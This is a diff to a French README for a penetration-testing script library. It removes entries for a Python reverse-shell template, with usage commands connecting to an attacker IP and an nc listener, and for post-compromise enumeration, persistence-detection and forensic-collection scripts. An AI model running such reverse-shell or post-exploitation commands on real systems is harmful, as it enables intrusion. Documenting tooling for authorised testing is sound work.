@@ -106,7 +106,7 @@ gscs gui
 
 # Générer un script depuis un template
 gscs template list
-gscs template use recon/nmap -o /opt/scripts/nmap_quick.sh --register
+gscs template use recon/nmap -o /opt/scripts/nmap_recon.sh --register
 
 # Exporter / importer la bibliothèque
 gscs export -o ma_librairie.json
@@ -241,91 +241,6 @@ recon_192.168.1.1_20260323_142500/
 └── p6_udp.{nmap,gnmap,xml,html,log}     (si --udp)
 ```
 
----
-
-### `exploit/revshell-python` — Reverse shell Python
-**Langage :** python | **Dépendance :** aucune
-
-> **Réservé aux tests autorisés uniquement.**
-
-Se connecte en TCP à l'IP/port de l'attaquant et exécute les commandes reçues. Gère les timeouts par commande (30 s) et les erreurs de sortie.
-
-```bash
-# Sur la machine cible (après obtention d'une RCE)
-python3 revshell.py 10.10.14.5 4444
-
-# Sur la machine attaquante
-nc -lvnp 4444
-```
-
----
-
-### `post-exploit/sysinfo` — Collecte d'informations système
-**Langage :** bash | **Dépendance :** aucune
-
-Rassemble en une passe les informations utiles après compromission : utilisateur courant, interfaces réseau, ports en écoute, droits sudo, binaires SUID, crontabs, variables d'environnement.
-
-```bash
-./sysinfo.sh
-# === SYSTEM ===
-# Linux kali 6.x.x-kali ...
-# === SUDO RIGHTS ===
-# (root) NOPASSWD: /usr/bin/vim
-# === SUID BINARIES ===
-# /usr/bin/sudo  /usr/bin/passwd ...
-```
-
----
-
-### `post-exploit/persistence-check` — Détection des mécanismes de persistance
-**Langage :** bash | **Dépendance :** aucune
-
-Inspecte les emplacements classiques de persistance Linux : crontabs de tous les utilisateurs, services systemd non-standard, scripts d'initialisation, fichiers `.bashrc`/`.profile`, `authorized_keys`, binaires SUID/SGID.
-
-```bash
-./persistence_check.sh
-# === SYSTEMD SERVICES (non-standard) ===
-# backdoor.service  loaded active running ...
-# === AUTHORIZED KEYS ===
-# --- /home/user/.ssh/authorized_keys ---
-# ssh-rsa AAAA... attacker@kali
-```
-
----
-
-### `forensic/log-collect` — Collecte de logs pour analyse forensique
-**Langage :** bash | **Dépendance :** aucune
-
-Crée un répertoire horodaté et y copie : logs `/var/log`, journal systemd, liste des processus, connexions réseau, sessions actives (`last`, `who`), `/etc/passwd`, `/etc/shadow`. Génère un manifeste SHA256 de tous les fichiers collectés.
-
-```bash
-./log_collect.sh /mnt/usb/forensic_2026-03-23
-# [*] Collecting to /mnt/usb/forensic_2026-03-23
-# [+] Collection complete
-# [+] Manifest: /mnt/usb/forensic_2026-03-23/MANIFEST.sha256
-```
-
----
-
-### `custom/skeleton-bash` — Squelette de script Bash
-**Langage :** bash | **Dépendance :** aucune
-
-Modèle de départ pour un script Bash robuste : `set -euo pipefail`, parsing d'arguments avec `getopts`, fonctions `log/ok/err/dbg`, usage automatique.
-
-```bash
-./mon_script.sh -v -o results.txt cible.exemple.com
-```
-
----
-
-### `custom/skeleton-python` — Squelette de script Python
-**Langage :** python | **Dépendance :** aucune (stdlib uniquement)
-
-Modèle de départ pour un script Python : `argparse` avec `--verbose` et `--output`, logging formaté avec horodatage, structure `main() → int` propre.
-
-```bash
-python3 mon_script.py --verbose -o results.txt cible.exemple.com
-```
 
 <br>
 
